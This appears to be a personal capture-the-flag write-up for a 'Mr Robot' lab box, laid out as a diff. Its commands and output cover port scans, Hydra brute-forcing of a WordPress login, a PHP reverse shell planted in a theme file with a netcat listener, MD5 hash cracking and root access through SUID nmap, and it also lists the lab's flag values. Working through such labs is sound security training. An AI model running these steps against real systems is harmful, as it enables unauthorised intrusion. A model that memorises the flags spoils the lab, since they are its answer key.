@@ -1,0 +1,215 @@
+rustscan -a 10.10.229.128 -- -A   
+
+Open 10.10.229.128:80
+Open 10.10.229.128:443
+
+80/tcp  open  http     syn-ack ttl 63 Apache httpd
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+|_http-server-header: Apache
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open  ssl/http syn-ack ttl 63 Apache httpd
+|_http-server-header: Apache
+| ssl-cert: Subject: commonName=www.example.com
+| Issuer: commonName=www.example.com
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2015-09-16T10:45:03
+| Not valid after:  2025-09-13T10:45:03
+| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
+| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
+| -----BEGIN CERTIFICATE-----
+| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
+| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
+| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
+| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
+| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
+| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
+| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
+| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
+| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
+|_-----END CERTIFICATE-----
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+
+
+==========###==========###==========###==========###==========###
+
+==========###==========###==========###==========###==========###
+
+
+gobuster dir -u http://10.10.229.128 -w /usr/share/dirb/wordlists/common.txt 
+
+
+
+/admin                (Status: 301) [Size: 235] [--> http://10.10.229.128/admin/]
+/atom                 (Status: 301) [Size: 0] [--> http://10.10.229.128/feed/atom/] downloadable
+/dashboard            (Status: 302) [Size: 0] [--> http://10.10.229.128/wp-admin/]                             
+/feed                 (Status: 301) [Size: 0] [--> http://10.10.229.128/feed/]     
+/images               (Status: 301) [Size: 236] [--> http://10.10.229.128/images/] 
+/image                (Status: 301) [Size: 0] [--> http://10.10.229.128/image/]    
+/Image                (Status: 301) [Size: 0] [--> http://10.10.229.128/Image/]    
+/index.html           (Status: 200) [Size: 1077]                                   
+/index.php            (Status: 301) [Size: 0] [--> http://10.10.229.128/]          
+/intro                (Status: 200) [Size: 516314]                 
+          
+/license              (Status: 200) [Size: 309]   
+                                 
+/login                (Status: 302) [Size: 0] [--> http://10.10.229.128/wp-login.php] !!!
+
+/robots               (Status: 200) [Size: 41]                                       
+/robots.txt           (Status: 200) [Size: 41]                                       
+              
+
+/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.229.128/wp-admin/] 
+
+/wp-config            (Status: 200) [Size: 0]                                         
+/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.229.128/wp-includes/]
+/wp-cron              (Status: 200) [Size: 0]                                          
+/wp-links-opml        (Status: 200) [Size: 227]                                        
+/wp-load              (Status: 200) [Size: 0]                                          
+/wp-login             (Status: 200) [Size: 2613]                                       
+/wp-mail              (Status: 500) [Size: 3064]                                       
+/wp-settings          (Status: 500) [Size: 0]                                          
+/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.229.128/wp-login.php?action=register]
+
+==========###==========###==========###==========###==========###
+
+==========###==========###==========###==========###==========###
+
+
+Hint says robots.txt
+
+#navigate to 10.10.229.128/robots.txt
+	key-1-of-3.txt -> possible key
+	
+#10.10.229.128/key-1-of-3.txt
+	grab the key by navigating 
+Download fsocity.dic aswell   
+
+
+
+==========###==========###==========###==========###==========###
+
+==========###==========###==========###==========###==========###
+Find username:
+└─# hydra -L fsocity.dic -P asd -V 10.10.64.117 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^: Invalid username" -I
+
+Find password:
+└─# hydra -l Elliot -p fsocity.dic  -V 10.10.64.117 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^: Invalid username" -I
+
+also password in
+/license
+
+ZWxsaW90OkVSMjgtMDY1Mgo=
+
+echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+elliot:ER28-0652
+
+==========###==========###==========###==========###==========###
+
+==========###==========###==========###==========###==========###
+
+Exploiting wordpress
+Download php reverse shell from pentestmonkey
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+Go to Appearance -> editor -> Twenty fifteen theme -> edit 404.php
+copy the reverse shell then edit 
+the ip to (my ip) 
+and port(4444)
+
+
+listen netcat on attacking machine:
+#nc -nvlp 4444
+
+Navigate to 10.10.90.108/wordpress/wp-content/themes/twentyfifteen/404.php
+
+based on:
+https://www.hackingarticles.in/wordpress-reverse-shell/
+
+==========###==========###==========###==========###==========###
+
+==========###==========###==========###==========###==========###
+
+upgrade shell:
+
+#python -c 'import pty; pty.spawn("/bin/bash")'
+
+==========###==========###==========###==========###==========###
+
+==========###==========###==========###==========###==========###
+/home/robots:
+
+key-2-of-3.txt - robot owned, cant read
+
+password.raw-md5 - can read -> 
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+search about raw md5
+http://sgros.blogspot.com/2018/07/cracking-raw-md5-hashes-with-john-ripper.html
+
+#john --format=raw-md5 --wordlist=fsocity.dic md5.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2022-03-20 13:27) 0g/s 5047Kp/s 5047Kc/s 5047KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
+Session completed
+
+#su robot 
+# pw:?
+
+ABCDEFGHIJKLMNOPQRSTUVWXYZ didn't work because capitalised
+had to check writeup
+abcdefghijklmnopqrstuvwxyz is the pw
+Can read the key-2-of-3.txt 
+
+cat  key-2-of-3.txt 
+822c73956184f694993bede3eb39f959
+
+==========###==========###==========###==========###==========###
+
+==========###==========###==========###==========###==========###
+
+
+#find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
+-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
+-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
+-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
+-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
+-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap !!!
+-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
+
+
+nmap? It was also hinted
+Gtfobins : <https://gtfobins.github.io/gtfobins/nmap/> 
+
+As robot user:
+#/usr/local/bin/nmap --interactive
+#!sh
+root acces gained
+
+cd into root folder and get key 3
+04787ddef27c3dee1ee161b21670b4e4
+
+
+
+==========###==========###==========###==========###==========###
